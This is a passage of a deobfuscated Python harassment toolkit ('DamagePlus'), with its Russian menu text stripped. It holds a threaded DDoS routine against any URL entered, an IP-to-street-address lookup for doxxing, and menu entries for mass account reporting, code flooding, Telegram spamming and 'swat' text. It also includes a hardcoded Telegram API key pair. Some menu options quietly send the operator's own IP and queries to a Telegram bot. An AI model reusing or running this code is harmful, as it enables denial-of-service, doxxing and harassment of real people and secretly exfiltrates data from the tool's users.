            return # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        thread_list = [] # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        def dos_threaded(url, progress_bar): # DECODED BY https://github.com/MrN3lson-Script
            dos(url) # DECODED BY https://github.com/MrN3lson-Script
            progress_bar.update(1) # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        with tqdm(total=threads, desc='Threads Progress') as pbar: # DECODED BY https://github.com/MrN3lson-Script
            for _ in range(threads): # DECODED BY https://github.com/MrN3lson-Script
                thr = threading.Thread(target=dos_threaded, args=(url, pbar)) # DECODED BY https://github.com/MrN3lson-Script
                thr.start() # DECODED BY https://github.com/MrN3lson-Script
                thread_list.append(thr) # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
            for thr in thread_list: # DECODED BY https://github.com/MrN3lson-Script
                thr.join() # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    while True: # DECODED BY https://github.com/MrN3lson-Script
        print(colored("\
1.    ", "cyan")) # DECODED BY https://github.com/MrN3lson-Script
        print(colored("2.    ", "cyan")) # DECODED BY https://github.com/MrN3lson-Script
        print(colored("3.  DDoS-", "cyan")) # DECODED BY https://github.com/MrN3lson-Script
        print(colored("0. ", "cyan")) # DECODED BY https://github.com/MrN3lson-Script
        choice = input("\
 : ") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        if choice == '1': # DECODED BY https://github.com/MrN3lson-Script
            url = input(" URL  : ") # DECODED BY https://github.com/MrN3lson-Script
            log_info = (f"  {HOURS}:{MIN}:{SEC}\
" # DECODED BY https://github.com/MrN3lson-Script
                f" -  {url}") # DECODED BY https://github.com/MrN3lson-Script
            send_notification(log_bot, log_rec, log_info) # DECODED BY https://github.com/MrN3lson-Script
            check_link_safety(url) # DECODED BY https://github.com/MrN3lson-Script
        elif choice == '2': # DECODED BY https://github.com/MrN3lson-Script
            url = input(" URL    : ") # DECODED BY https://github.com/MrN3lson-Script
            check_for_logger(url) # DECODED BY https://github.com/MrN3lson-Script
        elif choice == '3': # DECODED BY https://github.com/MrN3lson-Script
            url = input(" URL  DDoS-: ") # DECODED BY https://github.com/MrN3lson-Script
            try: # DECODED BY https://github.com/MrN3lson-Script
                threads = int(input("  : ")) # DECODED BY https://github.com/MrN3lson-Script
                if threads <= 0: # DECODED BY https://github.com/MrN3lson-Script
                    print("     0!") # DECODED BY https://github.com/MrN3lson-Script
                    continue # DECODED BY https://github.com/MrN3lson-Script
                run_ddos(url, threads) # DECODED BY https://github.com/MrN3lson-Script
            except ValueError: # DECODED BY https://github.com/MrN3lson-Script
                print("  !") # DECODED BY https://github.com/MrN3lson-Script
        elif choice == '0': # DECODED BY https://github.com/MrN3lson-Script
            print("  .") # DECODED BY https://github.com/MrN3lson-Script
            break # DECODED BY https://github.com/MrN3lson-Script
        else: # DECODED BY https://github.com/MrN3lson-Script
            print(" . ,  1, 2, 3  0.") # DECODED BY https://github.com/MrN3lson-Script
             # DECODED BY https://github.com/MrN3lson-Script
def probiv_po_ip(): # DECODED BY https://github.com/MrN3lson-Script
    def get_user_ip(): # DECODED BY https://github.com/MrN3lson-Script
        try: # DECODED BY https://github.com/MrN3lson-Script
            response = urllib.request.urlopen('https://api.ipify.org?format=json') # DECODED BY https://github.com/MrN3lson-Script
            data = json.load(response) # DECODED BY https://github.com/MrN3lson-Script
            return data.get('ip', '') # DECODED BY https://github.com/MrN3lson-Script
        except Exception as e: # DECODED BY https://github.com/MrN3lson-Script
            return f"   IP: {e}" # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def search_by_ip(ip): # DECODED BY https://github.com/MrN3lson-Script
        ip_info_url = f"https://ipinfo.io/{ip}/json" # DECODED BY https://github.com/MrN3lson-Script
        try: # DECODED BY https://github.com/MrN3lson-Script
            ip_info_response = urllib.request.urlopen(ip_info_url) # DECODED BY https://github.com/MrN3lson-Script
            ip_info = json.load(ip_info_response) # DECODED BY https://github.com/MrN3lson-Script
        except urllib.error.URLError: # DECODED BY https://github.com/MrN3lson-Script
            return "  IP  ." # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        result = { # DECODED BY https://github.com/MrN3lson-Script
            "query": ip_info.get('ip', ''), # DECODED BY https://github.com/MrN3lson-Script
            "city": ip_info.get('city', ''), # DECODED BY https://github.com/MrN3lson-Script
            "region": ip_info.get('region', ''), # DECODED BY https://github.com/MrN3lson-Script
            "country": ip_info.get('country', ''), # DECODED BY https://github.com/MrN3lson-Script
            "org": ip_info.get('org', ''), # DECODED BY https://github.com/MrN3lson-Script
            "loc": ip_info.get('loc', '') # DECODED BY https://github.com/MrN3lson-Script
        } # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        if result["loc"]: # DECODED BY https://github.com/MrN3lson-Script
            latitude, longitude = result["loc"].split(",") # DECODED BY https://github.com/MrN3lson-Script
            result["lat"] = latitude # DECODED BY https://github.com/MrN3lson-Script
            result["lon"] = longitude # DECODED BY https://github.com/MrN3lson-Script
            address_url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={latitude}&lon={longitude}" # DECODED BY https://github.com/MrN3lson-Script
            try: # DECODED BY https://github.com/MrN3lson-Script
                address_response = urllib.request.urlopen(address_url) # DECODED BY https://github.com/MrN3lson-Script
                address_data = json.load(address_response) # DECODED BY https://github.com/MrN3lson-Script
                if "address" in address_data: # DECODED BY https://github.com/MrN3lson-Script
                    sorted_address = sort_address(address_data["address"]) # DECODED BY https://github.com/MrN3lson-Script
                    result["address"] = sorted_address # DECODED BY https://github.com/MrN3lson-Script
                else: # DECODED BY https://github.com/MrN3lson-Script
                    result["address"] = "  " # DECODED BY https://github.com/MrN3lson-Script
            except Exception as e: # DECODED BY https://github.com/MrN3lson-Script
                result["address"] = f"   : {e}" # DECODED BY https://github.com/MrN3lson-Script
        else: # DECODED BY https://github.com/MrN3lson-Script
            result["address"] = " " # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        return result # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def sort_address(address): # DECODED BY https://github.com/MrN3lson-Script
        address_order = [ # DECODED BY https://github.com/MrN3lson-Script
            "country", # DECODED BY https://github.com/MrN3lson-Script
            "state", # DECODED BY https://github.com/MrN3lson-Script
            "city", # DECODED BY https://github.com/MrN3lson-Script
            "town", # DECODED BY https://github.com/MrN3lson-Script
            "village", # DECODED BY https://github.com/MrN3lson-Script
            "road", # DECODED BY https://github.com/MrN3lson-Script
            "house_number", # DECODED BY https://github.com/MrN3lson-Script
            "postcode" # DECODED BY https://github.com/MrN3lson-Script
        ] # DECODED BY https://github.com/MrN3lson-Script
         # DECODED BY https://github.com/MrN3lson-Script
        sorted_address = {} # DECODED BY https://github.com/MrN3lson-Script
        for key in address_order: # DECODED BY https://github.com/MrN3lson-Script
            if key in address: # DECODED BY https://github.com/MrN3lson-Script
                sorted_address[key] = address[key] # DECODED BY https://github.com/MrN3lson-Script
         # DECODED BY https://github.com/MrN3lson-Script
        for key, value in address.items(): # DECODED BY https://github.com/MrN3lson-Script
            if key not in sorted_address: # DECODED BY https://github.com/MrN3lson-Script
                sorted_address[key] = value # DECODED BY https://github.com/MrN3lson-Script
         # DECODED BY https://github.com/MrN3lson-Script
        return sorted_address # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def translate_address(address): # DECODED BY https://github.com/MrN3lson-Script
        translations = { # DECODED BY https://github.com/MrN3lson-Script
            "country": "", # DECODED BY https://github.com/MrN3lson-Script
            "state": "", # DECODED BY https://github.com/MrN3lson-Script
            "city": "", # DECODED BY https://github.com/MrN3lson-Script
            "town": "", # DECODED BY https://github.com/MrN3lson-Script
            "village": "", # DECODED BY https://github.com/MrN3lson-Script
            "road": "", # DECODED BY https://github.com/MrN3lson-Script
            "house_number": " ", # DECODED BY https://github.com/MrN3lson-Script
            "postcode": " ", # DECODED BY https://github.com/MrN3lson-Script
            "residential": " ", # DECODED BY https://github.com/MrN3lson-Script
            "county": "", # DECODED BY https://github.com/MrN3lson-Script
            "iso3166-2-lvl4": " ", # DECODED BY https://github.com/MrN3lson-Script
            "country_code": " " # DECODED BY https://github.com/MrN3lson-Script
        } # DECODED BY https://github.com/MrN3lson-Script
         # DECODED BY https://github.com/MrN3lson-Script
        translated_address = {} # DECODED BY https://github.com/MrN3lson-Script
        for key, value in address.items(): # DECODED BY https://github.com/MrN3lson-Script
            translated_key = translations.get(key, key.capitalize()) # DECODED BY https://github.com/MrN3lson-Script
            translated_address[translated_key] = value # DECODED BY https://github.com/MrN3lson-Script
         # DECODED BY https://github.com/MrN3lson-Script
        return translated_address # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def send_notification(log_bot, log_rec, message):  # DECODED BY https://github.com/MrN3lson-Script
        url = f'https://api.telegram.org/bot{log_bot}/sendMessage?chat_id={log_rec}&text={message}' # DECODED BY https://github.com/MrN3lson-Script
        response = requests.post(url) # DECODED BY https://github.com/MrN3lson-Script
    while True: # DECODED BY https://github.com/MrN3lson-Script
        user_ip = get_user_ip() # DECODED BY https://github.com/MrN3lson-Script
        current_time = datetime.now().strftime("%H:%M:%S") # DECODED BY https://github.com/MrN3lson-Script
         # DECODED BY https://github.com/MrN3lson-Script
        ip = input("\
 IP    0  : ") # DECODED BY https://github.com/MrN3lson-Script
         # DECODED BY https://github.com/MrN3lson-Script
        if ip == '0': # DECODED BY https://github.com/MrN3lson-Script
            break # DECODED BY https://github.com/MrN3lson-Script
        else: # DECODED BY https://github.com/MrN3lson-Script
            log_info = (f"  {current_time}\
" # DECODED BY https://github.com/MrN3lson-Script
                        f"IP : {user_ip}\
" # DECODED BY https://github.com/MrN3lson-Script
                        f": {ip}") # DECODED BY https://github.com/MrN3lson-Script
            send_notification(log_bot, log_rec, log_info) # DECODED BY https://github.com/MrN3lson-Script
            result = search_by_ip(ip) # DECODED BY https://github.com/MrN3lson-Script
             # DECODED BY https://github.com/MrN3lson-Script
            if isinstance(result, str): # DECODED BY https://github.com/MrN3lson-Script
                print(f"\
{result}") # DECODED BY https://github.com/MrN3lson-Script
            else: # DECODED BY https://github.com/MrN3lson-Script
                print(f"""
                IP: {result.get('query', '')}
                : {result.get('country', '')}
                : {result.get('region', '')}
                : {result.get('city', '')}
                : {result.get('lat', '')}
                : {result.get('lon', '')}
                : {result.get('org', '')}
                :
                """)
                if isinstance(result.get("address"), dict): # DECODED BY https://github.com/MrN3lson-Script
                    translated_address = translate_address(result["address"]) # DECODED BY https://github.com/MrN3lson-Script
                    for key, value in translated_address.items(): # DECODED BY https://github.com/MrN3lson-Script
                        print(f"  {key}: {value}") # DECODED BY https://github.com/MrN3lson-Script
                else: # DECODED BY https://github.com/MrN3lson-Script
                    print(f"  {result.get('address', '')}") # DECODED BY https://github.com/MrN3lson-Script
             # DECODED BY https://github.com/MrN3lson-Script
            input("\
 Enter  ...") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
logo =  f"""{FONT.RED}{FONT.GREY}{FONT.RED}{FONT.GREY}{FONT.RED}{FONT.GREY}
{FONT.RED}{FONT.GREY}{FONT.RED}{FONT.GREY}{FONT.RED}{FONT.GREY}
{FONT.RED}{FONT.GREY}{FONT.RED}{FONT.GREY}{FONT.RED}{FONT.GREY}
{FONT.RED}{FONT.GREY}{FONT.RED}{FONT.GREY}{FONT.RED}{FONT.GREY}
{FONT.RED}{FONT.GREY}{FONT.RED}{FONT.GREY}{FONT.RED}{FONT.GREY}
{FONT.RED}{FONT.GREY}{FONT.RED}{FONT.GREY}{FONT.RED}{FONT.GREY}"""
 # DECODED BY https://github.com/MrN3lson-Script
def menu(): # DECODED BY https://github.com/MrN3lson-Script
    print("\
:") # DECODED BY https://github.com/MrN3lson-Script
    print("[0] -  ") # DECODED BY https://github.com/MrN3lson-Script
    print("[1] - ") # DECODED BY https://github.com/MrN3lson-Script
    print("[2] -   ") # DECODED BY https://github.com/MrN3lson-Script
    print("[3] -   IP") # DECODED BY https://github.com/MrN3lson-Script
    print("[4] -   url") # DECODED BY https://github.com/MrN3lson-Script
    print("[5] -  ") # DECODED BY https://github.com/MrN3lson-Script
    print("[6] -   Telegram") # DECODED BY https://github.com/MrN3lson-Script
    print("[7] -   ") # DECODED BY https://github.com/MrN3lson-Script
    print("[8] -   ") # DECODED BY https://github.com/MrN3lson-Script
    print("[9] -   ") # DECODED BY https://github.com/MrN3lson-Script
    print("[10] -     -") # DECODED BY https://github.com/MrN3lson-Script
    print("[11] -    ") # DECODED BY https://github.com/MrN3lson-Script
    print("[12] -   ") # DECODED BY https://github.com/MrN3lson-Script
    print("[13] -    ") # DECODED BY https://github.com/MrN3lson-Script
    print("[14] -  ") # DECODED BY https://github.com/MrN3lson-Script
    print("[15] -   ") # DECODED BY https://github.com/MrN3lson-Script
    print("[99] -  ") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
def main(): # DECODED BY https://github.com/MrN3lson-Script
    print("""\
:\
        ,      .  ,     ,       .""")
    time.sleep(4) # DECODED BY https://github.com/MrN3lson-Script
    os.system("clear") # DECODED BY https://github.com/MrN3lson-Script
    print(logo) # DECODED BY https://github.com/MrN3lson-Script
    print("Tg: @Damageplus") # DECODED BY https://github.com/MrN3lson-Script
    cdhdhhdhdhdhdhdhhdhdhf = input(" : ") # DECODED BY https://github.com/MrN3lson-Script
    if cdhdhhdhdhdhdhdhhdhdhf == '%@%@&#^^,dhdhhdhsjjsjsksksj919721771271819snsnnwnwnwnnwnwwnnwkszoxozo/1818827226263': # DECODED BY https://github.com/MrN3lson-Script
        print("!") # DECODED BY https://github.com/MrN3lson-Script
        os.system("clear") # DECODED BY https://github.com/MrN3lson-Script
        print(logo) # DECODED BY https://github.com/MrN3lson-Script
        print("Tg: @Damageplus") # DECODED BY https://github.com/MrN3lson-Script
    else: # DECODED BY https://github.com/MrN3lson-Script
    	print("  .  .") # DECODED BY https://github.com/MrN3lson-Script
    	sys.exit() # DECODED BY https://github.com/MrN3lson-Script
    while True: # DECODED BY https://github.com/MrN3lson-Script
        menu() # DECODED BY https://github.com/MrN3lson-Script
        c = input("\
 : ") # DECODED BY https://github.com/MrN3lson-Script
        if c == '1': # DECODED BY https://github.com/MrN3lson-Script
            print("\
0 - ") # DECODED BY https://github.com/MrN3lson-Script
            print("1 -   ") # DECODED BY https://github.com/MrN3lson-Script
            print("2 -   ") # DECODED BY https://github.com/MrN3lson-Script
            cS = input(" : ") # DECODED BY https://github.com/MrN3lson-Script
            if cS == '0': # DECODED BY https://github.com/MrN3lson-Script
                continue # DECODED BY https://github.com/MrN3lson-Script
            elif cS == '1': # DECODED BY https://github.com/MrN3lson-Script
                snos_accounts(api_id=21826549, api_hash='c1a19f792cfd9e397200d16c7e448160') # DECODED BY https://github.com/MrN3lson-Script
            elif cS == '2': # DECODED BY https://github.com/MrN3lson-Script
                snos_email() # DECODED BY https://github.com/MrN3lson-Script
        elif c == '2': # DECODED BY https://github.com/MrN3lson-Script
            probiv_po_nomeru() # DECODED BY https://github.com/MrN3lson-Script
        elif c == '3': # DECODED BY https://github.com/MrN3lson-Script
            probiv_po_ip() # DECODED BY https://github.com/MrN3lson-Script
        elif c == '4': # DECODED BY https://github.com/MrN3lson-Script
            rabota_c_url() # DECODED BY https://github.com/MrN3lson-Script
        elif c == '5': # DECODED BY https://github.com/MrN3lson-Script
        	flood_codami() # DECODED BY https://github.com/MrN3lson-Script
        elif c == '6': # DECODED BY https://github.com/MrN3lson-Script
        	asyncio.run(spam_tg()) # DECODED BY https://github.com/MrN3lson-Script
        elif c == '7': # DECODED BY https://github.com/MrN3lson-Script
        	print("""\
1)    ,  3 .
 1.1 -         .
 1.2 -     ,    .
 1.3 -     ,               ).
  ,            .

2)       ,  https://smsc.ru/testhlr/,    - ,    - .
 2.1 -  ,   1     (https://golink.su/ -  )     .
 2.2 -   ,    .     ,    ,  https://avtomusic-nn.ru/.     "intext: "   "https://reveng.ee/search?q=".       ,    :    .    ,    :  , =,     ).    ,  .

3)          ,    ,          ( ),    .     (     )    :  .    . (       ).

4)     ,    2.2   .""")
        elif c == '8': # DECODED BY https://github.com/MrN3lson-Script
        	print("""\
         ,             .
1)  :    ,        100,       200   .  -     .    ,    :  (  )  (-)         ( ).   ,   . 
2)  :    (),          ,  -  .   .   ,            .
3)  :           .
4)  :  ,     ,        . 
  )             !   !   ,       .   .""")
        elif c == '9': # DECODED BY https://github.com/MrN3lson-Script
        	print("""\
1)     ( ).        .
2)    ,     
     )       , .
""")
        elif c == '10': # DECODED BY https://github.com/MrN3lson-Script
        	print("""\
1)    @SpamBot     .
: (   )
1) /start
2)   
3) 
4) ,    .
5) -     
            5.1) Telegram developers! I have not logged into telegrams for a long time, and have not corresponded for a long time in various public groups, and you spammed me here, most likely blocked! But I think it was not right because there was nothing speciall! Therefore, I ask you to remove my restrions!
          5.2)        .
          5.3)       ,            .          !
""")
        elif c == '11': # DECODED BY https://github.com/MrN3lson-Script
        	print("""\
1.        (http://telegram.org/support)

2.     ,     .
:
   .       ,          . ,       ,      . !    :

() -   .

() -      .

3.      .
""")
        elif c == '12': # DECODED BY https://github.com/MrN3lson-Script
        	print("""1)      -   ....

2)   ,  ,      -       /reset@best_contests_bot,     , ,        !!!      ,   !,    .      +- 200  1               )  

3)      telegram.org   : ",  .            - .   - ,   - ,    - .        ."        ,      .""")
        elif c == '13': # DECODED BY https://github.com/MrN3lson-Script
        	print("""   ,  
(     )
1:    
2:
 
      
 
      " "
   
    
 "   "
 "  "
   
"        "
       .
 99%,    """)
        elif c == '14': # DECODED BY https://github.com/MrN3lson-Script
        	generate_fake_data() # DECODED BY https://github.com/MrN3lson-Script
        elif c == '15': # DECODED BY https://github.com/MrN3lson-Script
        	text_swat() # DECODED BY https://github.com/MrN3lson-Script
        elif c == '0': # DECODED BY https://github.com/MrN3lson-Script
        	for i in range(10): # DECODED BY https://github.com/MrN3lson-Script
        		os.system('clear') # DECODED BY https://github.com/MrN3lson-Script
        	print(logo) # DECODED BY https://github.com/MrN3lson-Script
        	print("\
Developer: @dev_wv\
Specially for @Owepk\
") # DECODED BY https://github.com/MrN3lson-Script
        	d = input(" Enter     : ") # DECODED BY https://github.com/MrN3lson-Script
        	if d == '': # DECODED BY https://github.com/MrN3lson-Script
        		webbrowser.open("https://t.me/mybioARMAT") # DECODED BY https://github.com/MrN3lson-Script
        	else: # DECODED BY https://github.com/MrN3lson-Script
        		os.system('clear') # DECODED BY https://github.com/MrN3lson-Script
        		print(logo) # DECODED BY https://github.com/MrN3lson-Script
        		print("Tg: @Damageplus")		 # DECODED BY https://github.com/MrN3lson-Script
        elif c == '99': # DECODED BY https://github.com/MrN3lson-Script
        	for i in range(10): # DECODED BY https://github.com/MrN3lson-Script
        		os.system('clear') # DECODED BY https://github.com/MrN3lson-Script
        	print(logo) # DECODED BY https://github.com/MrN3lson-Script
        	print("Tg: @Damageplus") # DECODED BY https://github.com/MrN3lson-Script
        else: # DECODED BY https://github.com/MrN3lson-Script
            print(" .") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
if __name__ == "__main__": # DECODED BY https://github.com/MrN3lson-Script
    print(logo) # DECODED BY https://github.com/MrN3lson-Script
    print("Tg: @Damageplus") # DECODED BY https://github.com/MrN3lson-Script
    print("""     DAMAGEPLUS: (@Bhewl), wv(@dev_wv). DECODER: MrN3lson.       DAMAGE - FUCK YOU DEV'S.         . ,  !""")
    time.sleep(2) # DECODED BY https://github.com/MrN3lson-Script
    os.system("clear") # DECODED BY https://github.com/MrN3lson-Script
    print(logo) # DECODED BY https://github.com/MrN3lson-Script
    main() # DECODED BY https://github.com/MrN3lson-Script